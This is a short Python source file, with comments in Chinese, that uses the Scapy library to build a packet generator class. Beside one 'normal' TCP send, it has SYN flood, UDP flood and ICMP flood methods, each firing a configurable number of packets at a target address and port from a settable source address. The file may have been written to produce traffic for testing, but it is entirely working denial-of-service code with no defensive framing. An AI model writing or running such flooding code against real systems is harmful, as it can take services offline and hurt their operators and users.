from scapy.all import *
from scapy.layers.inet import *
import random

class Generator:
    def __init__(self, src_ip, dst_ip, src_port, dst_port, attack_duration, packet_rate):
        self.src_ip = src_ip
        self.dst_ip = dst_ip
        self.src_port = src_port
        self.dst_port = dst_port
        self.attack_duration = attack_duration  # 攻击持续时间（秒）
        self.packet_rate = packet_rate  # 每秒发送的包数量
        self.packet_count = attack_duration * packet_rate

    def normal(self):
        packet = IP(src=self.src_ip, dst=self.dst_ip) / TCP(sport=self.src_port, dport=self.dst_port)
        send(packet, verbose=0)

    def syn_flood(self):
        for _ in range(self.packet_count):
            packet = IP(src=self.src_ip, dst=self.dst_ip) / TCP(sport=self.src_port, dport=self.dst_port, flags='S')
            send(packet, verbose=0)

    def udp_flood(self):
        for _ in range(self.packet_count):
            packet = IP(src=self.src_ip, dst=self.dst_ip) / UDP(sport=self.src_port, dport=self.dst_port)
            send(packet, verbose=0)

    def icmp_flood(self):
        for _ in range(self.packet_count):
            packet = IP(src=self.src_ip, dst=self.dst_ip) / ICMP()
            send(packet, verbose=0)
